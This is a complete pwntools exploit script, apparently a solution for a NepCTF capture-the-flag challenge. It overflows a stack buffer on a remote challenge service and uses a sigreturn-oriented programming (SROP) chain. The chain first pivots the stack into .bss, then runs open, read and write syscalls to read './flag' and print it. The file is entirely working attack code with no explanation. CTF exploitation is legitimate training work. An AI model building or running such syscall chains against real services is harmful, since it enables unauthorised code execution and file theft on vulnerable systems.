from pwn import *
context(os='linux', arch='amd64', log_level='debug')
# io = process("./pwn")
p = remote("nepctf.1cepeak.cn", 31943)

mov_eax_15 = 0x0000400754   #0x0000000000400754 : mov eax, 0xf ; pop rbp ; ret
buf = 0x00000601050         #.bss:0000000000601050
ret = 0x004007AE            #.text:00000000004007AD C9                            leave
                            #.text:00000000004007AE C3                            retn
syscall = 0x0004005B0       #.plt:00000000004005B0                               ; [00000006 BYTES: COLLAPSED FUNCTION _syscall. PRESS CTRL-NUMPAD+ TO EXPAND]
pop_rdi = 0x0000000000400813    #0x0000000000400813 : pop rdi ; ret
stack = 0x0601a50
#开出一个栈
frame = SigreturnFrame()
frame.rdi = 0
frame.rsi = 0
frame.rdx = stack-0x8
frame.rcx = 0x1000
frame.rip = syscall
frame.rsp = stack

payload = b"a" * (0x0030+8) + flat([
    pop_rdi,
    15,
    syscall
]) + bytes(frame)


p.send(payload)
sleep(1)
#orw
frame = SigreturnFrame()
frame.rdi = 2
frame.rsi = stack-0x8
frame.rdx = 0
frame.rcx = 0x1000
frame.rip = syscall
frame.rsp = stack + 0x110
payload = b"./flag\x00\x00" + flat([
    pop_rdi,
    15,
    syscall 
]) + bytes(frame) 

frame = SigreturnFrame()
frame.rdi = 0
frame.rsi = 3
frame.rdx = stack-0x100
frame.rcx = 0x40
frame.rip = syscall
frame.rsp = stack + 0x110 + 0x110
payload += flat([
    pop_rdi,
    15,
    syscall 
]) + bytes(frame) 

frame = SigreturnFrame()
frame.rdi = 1
frame.rsi = 1
frame.rdx = stack-0x100
frame.rcx = 0x40
frame.rip = syscall
frame.rsp = stack + 0x110 + 0x110 + 0x110
payload += flat([
    pop_rdi,
    15,
    syscall 
]) + bytes(frame) 

log.success(f"length {len(payload):#x}")
p.send(payload)

p.interactive()
